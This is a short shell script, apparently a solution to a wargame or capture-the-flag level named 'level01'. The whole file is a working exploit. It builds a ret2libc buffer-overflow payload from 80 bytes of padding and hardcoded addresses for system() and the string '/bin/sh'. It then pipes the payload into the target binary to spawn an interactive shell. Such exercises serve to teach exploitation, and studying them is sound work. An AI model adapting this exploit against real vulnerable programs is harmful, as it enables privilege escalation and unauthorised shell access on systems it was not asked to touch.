#!/bin/sh

export BIN_SH_ADDR=0xf7f897ec
export SYSTEM_ADDR=0xf7e6aed0
export OVERFLOW_SIZE=80
echo 'dat_wil' > /tmp/payload.01
python -c "import struct;PAYLOAD = 'A' * $OVERFLOW_SIZE + struct.pack('<I', $SYSTEM_ADDR) +'AAAA' +  struct.pack('<I', $BIN_SH_ADDR);print PAYLOAD" >> /tmp/payload.01
cat /tmp/payload.01 - | ./level01